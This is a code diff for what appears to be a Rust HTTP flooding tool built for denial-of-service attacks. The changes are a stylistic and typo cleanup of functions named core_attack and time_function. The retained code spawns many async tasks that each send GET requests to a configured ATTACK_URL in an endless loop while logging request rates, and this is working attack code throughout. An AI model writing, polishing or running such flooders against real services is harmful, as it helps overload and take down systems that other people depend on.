@@ -19,16 +19,16 @@ pub async fn start() {
 
 unsafe fn core_attack() {
     if ON_THREADS + 1 < crate::FORCE {
-        ON_THREADS = ON_THREADS + 1;
+        ON_THREADS += 1;
         tokio::spawn(async {
             loop {
                 let now = Instant::now();
-                let error_data = request(&crate::ATTACK_URL).await;
+                let error_data = request(crate::ATTACK_URL).await;
                 match error_data {
                     Ok(status_code) => {
-                        AMOUNT = AMOUNT + 1;
+                        AMOUNT += 1;
                         println!(
-                            "On threads: {}, Status code {}, Time Passed for request {} sec, Request per 10 Millsecond {}",
+                            "On threads: {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
                             ON_THREADS,
                             status_code.status(),
                             now.elapsed().as_secs(),
@@ -37,9 +37,9 @@ unsafe fn core_attack() {
                     }
                     Err(data) => {
                         println!(
-                            "On threads: {}, Status ERROR {} Request per 10 Millsecond {}",
+                            "On threads: {}, Status ERROR {} Request per 10 Millisecond {}",
                             ON_THREADS,
-                            data.to_string(),
+                            data,
                             AMOUNT
                         );
                     }
@@ -47,12 +47,12 @@ unsafe fn core_attack() {
             }
         });
     } else {
-        time_funtion();
+        time_function();
     }
 }
 
-unsafe fn time_funtion() {
-    ON_THREADS = ON_THREADS + 1;
+unsafe fn time_function() {
+    ON_THREADS += 1;
     loop {
         thread::sleep(time::Duration::from_millis(10));
         AMOUNT = 0;
@@ -61,8 +61,8 @@ unsafe fn time_funtion() {
 
 async fn request(url: &str) -> Result<Response, reqwest::Error> {
     let output = reqwest::Client::new().get(url).send().await;
-    return match output {
+    match output {
         Ok(data) => Ok(data),
         Err(err) => Err(err),
-    };
+    }
 }
